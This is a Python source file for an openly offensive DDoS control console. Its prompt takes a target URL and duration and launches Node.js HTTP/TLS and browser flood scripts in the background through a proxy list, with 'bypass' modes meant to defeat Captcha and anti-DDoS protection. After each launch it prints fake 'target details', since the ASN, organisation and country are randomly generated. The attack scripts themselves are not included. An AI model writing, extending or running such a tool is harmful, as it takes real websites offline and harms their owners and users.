# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
from colorama import Fore, Back, init
import codecs

author = ""

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()

def examplehttps():
  print("""\x1b[38;5;40m
  Ex : https https://example.com 120
  """)
  
def examplemix():
  print("""\x1b[38;5;40m
  Ex : mix https://example.com 120
  """)
  
def examplebypass():
  print("""\x1b[38;5;40m
  Ex : bypasshttps://example.com 120
  """)   
     
def examplebrowser():
  print("""\x1b[38;5;40m
  Ex : browser https://example.com 120
  """)

def exampletls():
  print("""\x1b[38;5;40m
  Ex : tls https://example.com 120
  """)    
def menu():
  print('''
\x1b[38;5;40m Help\x1b[0m Visitors:
\x1b[0m - layer7  | best method layer7 to see it
\x1b[0m - rules   | rules and text embedding
\x1b[0m - support | support if you need help
\x1b[0m - clea r  | clear function returns to the initial display
\x1b[0m - restart | restart turn it off and turn it back on 
''')

def country():
    # Membuat daftar negara dan singkatannya
    countries = {
        "United States": "US",
        "United Kingdom": "UK",
        "Canada": "CA",
        "Australia": "AU",
        # Tambahkan negara lain di sini sesuai kebutuhan
    }
    
    # Memilih secara acak sebuah negara dari daftar
    random_country = random.choice(list(countries.keys()))
    
    # Mengembalikan nama negara dan singkatannya
    return random_country, countries[random_country]

# Fungsi untuk mendapatkan informasi ASN dan ORG secara acak
def get_asn_org():
    # ASN diambil secara acak antara 10000 dan 99999
    asn = random.randint(10000, 99999)
    # Memilih secara acak antara "OVH" dan "Cloudflare Inc."
    org = random.choice(["OVH", "Cloudflare Inc."])
    return str(asn), org

# Fungsi untuk mendapatkan waktu saat ini dalam format yang diinginkan
from datetime import datetime

def waktu():
    # Mendapatkan waktu saat ini dalam format yang diinginkan
    return datetime.now().strftime("%b %d %Y %H:%M:%S")

# Mendapatkan hasil dari fungsi country()
nama_negara, singkatan = country()

# Mendapatkan informasi ASN dan ORG secara acak
asn, org = get_asn_org()
                
def support():
  print("""
you can dm me in telegram: \x1b[38;5;160m@Minh_Quan_CB
""")

def rules():
    print("""
\x1b[38;5;45m  1. DO NOT USE BYPASS FOR MORE THAN 60 SECONDS
\x1b[38;5;46m  2. REMEMBER REX IS GOOD LIKES UPDATES      
\x1b[38;5;47m  3. USE IT WISELY SO THAT THERE IS NO ILLEGAL IMPRESSION                     
\x1b[38;5;48m  4. DON'T SPAM ATTACKS CAN RESULT IN OVERLOAD55                               
\x1b[38;5;49m  5. REMEMBER BYPASS IS THE STRONGEST METHOD                                           

""")
    
def layer7():
    print("""\x1b[38;5;41m
 Layer7 \x1b[0mAttack Vectors:
 - https: https/2 flood for high rq/s
 - bypass: https/2 flood made for bypassing
 - browser: browser flood to bypass Captha / UAM
 - mix: mix high rq/s for vuln web
 - tls: tls flood attack sent the tls method
""")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""\x1b[0m
                                                                                                   BY NÔNG MINH QUÂN 
\x1b[38;2;214;4;844m
\x1b[38;5;34m                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⣲⠟⠁⠀⠀⠀⠀⠀  ⠀⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;35m                 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠖⠋⢀⠞⠁⠀ ⠀⠀⠀  ⠀⢀⠜⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;36m                 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠊⠀⠀⡠⠋⠀⠀⠀⠀⠀ ⠀  ⣠⠊⡰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;37m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠁⠀⠀⡜⠁⠀⠀⠀⠀⠀⠀⠀ ⣀⠤⠚⠁⡜⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;38m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⢸⠀⠀⠀⠀⢀⣀⣀⠤⠖⠈⠀⠀⢀⡜⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
\x1b[38;5;39m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠔⠓⠲⢤⣸⠒⣊⣭⠛⠉⠀⠀⠀⠀⠀⢀⣠⢿⡶⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;40m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⠀⣹⠎⠀⠀⠑⡄⠀⢀⡠⠔⢊⡥⢺⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;41m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠎⠀⠀⠀⣠⠞⠁⠀⠀⠀⢀⣾⠋⠁⣠⠞⠁⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;42m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠃⠀⡠⠊⡜⠁⠀⠀⠀⢀⡊⠁⠁⠀⢊⡀⠀⠀⠀⣀⣉⣓⣦⡤⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;43m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡤⠊⠁⠸⠀⠀⠀⡠⡖⡝⠀⠀⠀⠀⠀⠈⢉⡩⠭⠒⢋⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;44m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠁⠀⠀⠀⠑⠒⠛⠒⠋⠁⠀⠀⠀⠀⠀⠀⠘⠤⣀⡀⠈⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;45m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠜⠁⠀⠀⠀⠀⠀⠀⢀⣀⠤⠄⠀⠀⠀⡰⠚⢧⠉⠒⠒⠮⠽⣾⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;46m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⠁⡠⣖⠂⠀⠀⠀⡠⠋⠉⠀⡀⠀⠀⢀⡴⠁⠀⠸⡄⠀⠀⠀⠀⡇⠙⢌⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;47m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠘⠐⠁⣀⡠⠔⠋⣀⣀⡴⠚⠓⡶⣞⣉⣀⣀⡠⢤⠇⠀⠀⠀⢰⣃⡀⠈⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;48m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⣀⣠⡊⠁⡀⣠⠞⠁⠀⠀⠀⡜⠁⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⣿⠀⠈⠑⢄⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;49m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣽⢻⡏⠁⠀⠀⠀⢀⠞⠑⠦⠤⠤⠤⠄⡸⠁⠀⠀⠀⢸⠉⣆⠀⠀⠘⡾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;50m                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠀⠃⠀⠀⠀⢀⢏⠀⠀⠀⠀⠀⠀⡰⠁⠀⠀⠀⠀⢸⠀⠘⡄⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
\x1b[0m
⠀                    ⠀PLEASE TYPE [\x1b[38;5;160mHELP\x1b[0m] TO SHOW ALL COMMANDS

""")

    while True:
        sys.stdout.write(f"\x1b]2;[-] Owner-C2 / User [root] / Expry [Dec 25 2025 / Slot 0/2\x07")
        sin = input(" "+Back.GREEN+Fore.BLACK+" root@Owner-C2 "+Fore.RESET+Back.RESET+" ►► ")
        sinput = sin.split(" ")[0]
        if sinput == "restart" or sinput == "restart":
            os.system ("python3 main.py")        
        if sinput == "rules" or sinput == "rules":
            rules()
        if sinput == "clear" or sinput == "CLEAR":
            os.system ("clear")
            main()
        if sinput == "help" or sinput == "HELP":
            menu()
        if sinput == "layer7" or sinput == "LAYER7" or sinput == "l7" or sinput == "L7":
            layer7()
      
        elif sinput == "support" or sinput == "support":
                support()

#########LAYER-7########  
        elif sinput == "BYPASS" or sinput == "bypass":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'screen -dm node tls.js {url} {time} 64 5 proxy.txt uam')
                print(f"""
\x1b[38;2;214;4;844m\x1b[38;5;40m   Attack Details:
\x1b[38;2;169;13;846m  \x1b[0m   Status:    
\x1b[38;2;134;20;846m     Host:    [{Fore.GREEN} {url} {Fore.RESET}]
\x1b[38;2;143;18;846m     Port:    [\x1b[38;5;40m 443 \x1b[0m]     
\x1b[38;2;134;20;846m     Time:    [{Fore.GREEN} {time} {Fore.RESET}]
\x1b[38;2;134;20;846m     Method:  [\x1b[38;5;40m Bypass \x1b[0m]
\x1b[38;2;134;20;846m     Sent On: [\x1b[38;5;40m {waktu()} \x1b[0m]

\x1b[38;2;214;4;844m    Target Details:
\x1b[38;2;143;18;846m  \x1b[0m   ASN:     [\x1b[38;5;40m {asn} \x1b[0m]
\x1b[38;2;134;20;846m     ORG:     [\x1b[38;5;40m {org} \x1b[0m]
\x1b[38;2;169;13;846m     CONTRY:  [\x1b[38;5;40m {singkatan} \x1b[0m]
""")

            except ValueError:
                examplebyoass()
            except IndexError:
                examplebypass()

        elif sinput == "TLS" or sinput == "tls":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'screen -dm node tls.js {url} {time} 64 5 proxy.txt')
                print(f"""
\x1b[38;2;214;4;844m\x1b[38;5;40m   Attack Details:
\x1b[38;2;169;13;846m  \x1b[0m   Status:    
\x1b[38;2;134;20;846m     Host:    [{Fore.GREEN} {url} {Fore.RESET}]
\x1b[38;2;143;18;846m     Port:    [\x1b[38;5;40m 443 \x1b[0m]     
\x1b[38;2;134;20;846m     Time:    [{Fore.GREEN} {time} {Fore.RESET}]
\x1b[38;2;134;20;846m     Method:  [\x1b[38;5;40m Tls \x1b[0m]
\x1b[38;2;134;20;846m     Sent On: [\x1b[38;5;40m {waktu()} \x1b[0m]

\x1b[38;2;214;4;844m    Target Details:
\x1b[38;2;143;18;846m  \x1b[0m   ASN:     [\x1b[38;5;40m {asn} \x1b[0m]
\x1b[38;2;134;20;846m     ORG:     [\x1b[38;5;40m {org} \x1b[0m]
\x1b[38;2;169;13;846m     CONTRY:  [\x1b[38;5;40m {singkatan} \x1b[0m]
""")
            except ValueError:
                examplehttps()
            except IndexError:
                examplehttps()
            
        elif sinput == "HTTPS" or sinput == "https":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'screen -dm node https.js {url} 443 39 9 {time}')              
                print(f"""
\x1b[38;2;214;4;844m\x1b[38;5;40m   Attack Details:
\x1b[38;2;169;13;846m  \x1b[0m   Status:    
\x1b[38;2;134;20;846m     Host:    [{Fore.GREEN} {url} {Fore.RESET}]
\x1b[38;2;143;18;846m     Port:    [\x1b[38;5;40m 443 \x1b[0m]     
\x1b[38;2;134;20;846m     Time:    [{Fore.GREEN} {time} {Fore.RESET}]
\x1b[38;2;134;20;846m     Method:  [\x1b[38;5;40m Https \x1b[0m]
\x1b[38;2;134;20;846m     Sent On: [\x1b[38;5;40m {waktu()} \x1b[0m]

\x1b[38;2;214;4;844m    Target Details:
\x1b[38;2;143;18;846m  \x1b[0m   ASN:     [\x1b[38;5;40m {asn} \x1b[0m]
\x1b[38;2;134;20;846m     ORG:     [\x1b[38;5;40m {org} \x1b[0m]
\x1b[38;2;169;13;846m     CONTRY:  [\x1b[38;5;40m {singkatan} \x1b[0m]
""")
            except ValueError:
                examplehttps()
            except IndexError:
                examplehttps()

        elif sinput == "BROWSER" or sinput == "browser":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'screen -dm node browser.js {url} {time} 64 5 proxy.txt')
                print(f"""
\x1b[38;2;214;4;844m\x1b[38;5;40m   Attack Details:
\x1b[38;2;169;13;846m  \x1b[0m   Status:    
\x1b[38;2;134;20;846m     Host:    [{Fore.GREEN} {url} {Fore.RESET}]
\x1b[38;2;143;18;846m     Port:    [\x1b[38;5;40m 443 \x1b[0m]     
\x1b[38;2;134;20;846m     Time:    [{Fore.GREEN} {time} {Fore.RESET}]
\x1b[38;2;134;20;846m     Method:  [\x1b[38;5;40m Browser \x1b[0m]
\x1b[38;2;134;20;846m     Sent On: [\x1b[38;5;40m {waktu()} \x1b[0m]

\x1b[38;2;214;4;844m    Target Details:
\x1b[38;2;143;18;846m  \x1b[0m   ASN:     [\x1b[38;5;40m {asn} \x1b[0m]
\x1b[38;2;134;20;846m     ORG:     [\x1b[38;5;40m {org} \x1b[0m]
\x1b[38;2;169;13;846m     CONTRY:  [\x1b[38;5;40m {singkatan} \x1b[0m]
""")
            except ValueError:
                examplebrowser()
            except IndexError:
                examplebrowser()

        elif sinput == "MIX" or sinput == "mix":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'screen -dm node mike.js {url} {time} 32 9 proxy.txt')
                print(f"""
\x1b[38;2;214;4;844m\x1b[38;5;40m   Attack Details:
\x1b[38;2;169;13;846m  \x1b[0m   Status:    
\x1b[38;2;134;20;846m     Host:    [{Fore.GREEN} {url} {Fore.RESET}]
\x1b[38;2;143;18;846m     Port:    [\x1b[38;5;40m 443 \x1b[0m]     
\x1b[38;2;134;20;846m     Time:    [{Fore.GREEN} {time} {Fore.RESET}]
\x1b[38;2;134;20;846m     Method:  [\x1b[38;5;40m Mix \x1b[0m]
\x1b[38;2;134;20;846m     Sent On: [\x1b[38;5;40m {waktu()} \x1b[0m]

\x1b[38;2;214;4;844m    Target Details:
\x1b[38;2;143;18;846m  \x1b[0m   ASN:     [\x1b[38;5;40m {asn} \x1b[0m]
\x1b[38;2;134;20;846m     ORG:     [\x1b[38;5;40m {org} \x1b[0m]
\x1b[38;2;169;13;846m     CONTRY:  [\x1b[38;5;40m {singkatan} \x1b[0m]
""")
            except ValueError:
                examplemix()
            except IndexError:
                examplemix()

                    
main()